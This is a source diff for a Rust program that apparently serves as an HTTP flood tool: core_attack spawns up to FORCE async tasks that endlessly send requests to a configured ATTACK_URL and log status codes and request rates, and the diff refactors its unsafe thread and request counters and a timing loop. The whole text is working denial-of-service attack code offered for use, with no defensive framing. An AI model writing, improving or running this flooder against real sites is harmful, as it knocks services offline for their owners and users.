@@ -4,48 +4,49 @@ use std::thread;
 use reqwest::Response;
 use tokio::time::Instant;
 
-use crate::ram_manger::{check_pub_var, PUB_VAR, write_pub_var};
+use crate::ram_manger::PUB_VAR;
 
 static mut AMOUNT: u128 = 0;
 
-static mut ON_THREADS: u128 = 0;
+static mut THREADS_ON: u128 = 0;
+
 
 pub async fn start() {
-    unsafe {
-        loop {
-            core_attack();
-        }
+    loop {
+        core_attack();
     }
 }
 
-unsafe fn core_attack() {
+fn core_attack() {
     let error_threads = PUB_VAR.lock();
     match error_threads {
         Err(_) => {}
         Ok(mut threads) => {
             if threads.thread_on + 1 < crate::FORCE {
                 threads.thread_on += 1;
+                unsafe {
+                    THREADS_ON += 1;
+                }
                 drop(threads);
-                ON_THREADS += 1;
                 tokio::spawn(async {
                     loop {
                         let now = Instant::now();
                         let error_data = request(crate::ATTACK_URL);
                         match error_data.await {
-                            Ok(status_code) => {
+                            Ok(status_code) => unsafe {
                                 AMOUNT += 1;
                                 println!(
-                                    "On threads: {}, Status code {}, Time Passed for request {} sec, Request per 10 Millisecond {}",
-                                    ON_THREADS,
+                                    "Threads on {}, Status code {}, Time Passed for request {} sec, Request per 10 Millisecond {}",
+                                    THREADS_ON,
                                     status_code.status(),
                                     now.elapsed().as_secs(),
-                                    AMOUNT
+                                    AMOUNT,
+
                                 );
                             }
-                            Err(data) => {
+                            Err(data) => unsafe {
                                 println!(
-                                    "On threads: {}, Status ERROR {} Request per 10 Millisecond {}",
-                                    ON_THREADS,
+                                    "Status ERROR {} Request per 10 Millisecond {}",
                                     data,
                                     AMOUNT
                                 );
@@ -60,11 +61,22 @@ unsafe fn core_attack() {
     }
 }
 
-unsafe fn time_function() {
-    ON_THREADS += 1;
+fn time_function() {
     loop {
-        thread::sleep(time::Duration::from_millis(10));
-        AMOUNT = 0;
+        let error_threads = PUB_VAR.lock();
+        match error_threads {
+            Err(_) => {
+                thread::sleep(time::Duration::from_millis(2));
+            }
+            Ok(data) => unsafe {
+                println!("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
+                loop {
+                    AMOUNT = 0;
+                    println!("threads on: {}, time passed: {}", data.thread_on, AMOUNT);
+                    thread::sleep(time::Duration::from_millis(10));
+                }
+            }
+        }
     }
 }
 
